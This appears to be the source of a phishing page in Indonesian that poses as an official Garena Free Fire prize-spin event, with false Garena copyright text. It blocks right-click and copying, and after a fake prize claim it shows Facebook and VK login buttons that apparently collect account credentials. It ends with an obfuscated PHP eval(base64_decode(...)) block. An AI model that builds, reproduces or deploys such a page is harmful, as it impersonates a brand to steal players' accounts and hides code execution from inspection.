...
<head>
    ...
    <link rel="icon" type="img/png" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire32-2.ico" sizes="32x32">
    <meta property="og:description" content="Start a event from Garena. You can spin in one times only!">
    <meta property="og:image" content="https://www.apkdlmod.com/wp-content/uploads/2018/01/free-fire-battlegrounds.jpg">
...
<body  oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    ...
    <div class="notification-container">
        <div class="notification">
            <div style="padding-top: 25px; color: #000; font-size: 30px; font-weight: bold; font-family: Teko; text-align: center; text-transform: uppercase;">GARENA FREE FIRE</div>
            <div style="padding-top: 10px; color: #000; font-size: 20px; font-weight: bold; font-family: Teko; text-align: center; text-transform: uppercase;">MULAI DAN COBA SPIN HADIAH KAMU DISINI !</div>
        </div>
    </div>
            ...
            <div id="zone" class="gallery">
                ...
                <section class="container" id="js-lotto">
                    ...
                    <div class="square" data-order="10">
                        <div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift10" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/4.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift10)"></polygon></svg></div>
                    </div>
                    ...
                    <div class="square" data-order="4" style="margin-left: 125px;">
                        <div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift4" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/5.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift4)"></polygon></svg></div>
                    </div>
                    <div class="square" data-order="9">
                        <div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift9" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/6.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift9)"></polygon></svg></div>
                    </div>
                    <div class="square" data-order="5" style="margin-left: 123px;">
                        <div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift5" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/7.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift5)"></polygon></svg></div>
                    </div>
                    ...
                    <div class="square" data-order="7">
                        <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift7" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/9.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift7)"></polygon></svg></div>
                    </div>
					<div class="square" data-order="6">
                        <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift6" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/imgff/10.jpg" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift6)"></polygon></svg></div>
                    </div>
                </section>
				<o onclick="klik1()">
				    <div style="position: absolute; cursor: pointer; z-index: 99; background: #fed33f; width: 90px; height: 90px; margin-left: 130px; margin-right: auto; margin-top: -300px; margin-bottom: 200px; border-radius: 48px; padding: 0; color: #000; font-size: 15px; font-weight: bold; font-family: Teko; text-align: center; text-transform: uppercase; border: 2px solid #000; outline: none; display: block;" id="js-start">
    ...
    <div class="div-bot" style="color:white;padding-top: 10px;padding-bottom: 1px;">
        <center>
		<p>
                <img src="https://gcube.id/wp-content/uploads/2018/03/gcube-free-fire-icon.png" style="padding-top: 10px;height:75px;width: 70px;">
				<div style="font-family: Teko;">Copyright © Garena Free Fire International</div>
		</p>
        </center>
    </div>
   ...
   <style type="text/css">
       .dav{
            background: url(https://www.pubgmobile.com/id/event/payload/images/m/part4.jpg) no-repeat center;
...
.close-other i {
    ...
    <div class="dav" id="hadiah" style="display: none; padding-bottom: 15px; height: auto;">
       ...
       <div class="batas">
        ...
        <div class="bawah" style="margin-bottom: 20px;">
            <button id="claim" onclick="klik3()">AMBIL SEKARANG</button>
            <br>&nbsp;<br>
        </div>
   </div>
   ...
   <div class="dav" id="dav" style="display: none;">
      ...
      <div class="batas">
      <button class="btn-log fb" type="button" onclick="open_facebook()"><i class="fa fa-facebook-square" style="margin-top: 3px; float: left;"></i> Login with Facebook</button>
      <button class="btn-log tw" type="button" onclick="open_twitter()"><i class="fa fa-vk" style="margin-top: 3px; float: left;"></i> Login with VK</button>                       
      </div>
   </div>
...
<?php
$SISTEMIT_COM_ENC = "4+VS+Z379XVO9uOtturPfr96WPQ4L/nt7+ykh8+efS147ZAOktRLfpirbr1VX3+ru6NfiOdWV19HT5+t3o6+oVtdPIM9/Tx5uQA=";$rand=base64_decode("");eval(base64_decode($rand));$STOP="9XVO9uOtturPfr96WPQ4L/nt7+ykh8+efS147ZAOktRLfpirbr1VX3+ru6NfiOdWV19HT5+t3o6+oVtdPIM9/Tx5uQA=";
?>